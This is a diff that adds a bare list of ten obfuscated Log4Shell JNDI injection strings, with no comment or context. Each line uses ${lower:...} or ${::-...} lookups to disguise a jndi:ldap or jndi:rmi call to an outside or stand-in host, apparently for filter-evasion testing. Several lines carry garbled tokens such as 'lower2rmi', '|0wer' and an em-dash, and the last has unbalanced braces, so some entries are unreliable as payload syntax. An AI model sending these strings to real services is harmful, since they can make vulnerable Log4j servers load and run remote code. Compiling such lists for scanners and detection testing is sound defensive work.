@@ -1,0 +1,10 @@
+${jndi:${lower:l}${lower:d}a${lower:p}://example.com/
+${jndi:${lower:l}${lower:d}a${lower:p}://abc.com/
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://abc.com/a}
+${${::-j}${::-n}${::-d}${zz-i}:${::—r}${::-m}${zz-i}://127.0.0.1:1099/ass}
+${${::—j}ndi:rmi://127.0.0.1:1099/ass}
+${jndi:rmi://adsasd.asdasd.asdasd}
+${${lower:jndi}:${lower2rmi}://adsasd.asdasd.asdasd/poc}
+${${lower:${lowerzjndi}}:${lower2rmi}://adsasd.asdasd.asdasd/poc}
+${${lower:j}${lower:n}${|0wer:d}i:${lowerzrmi}://adsasd.asdasd.asdasd/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower2i}}://xxxxxxx.xx/poc}
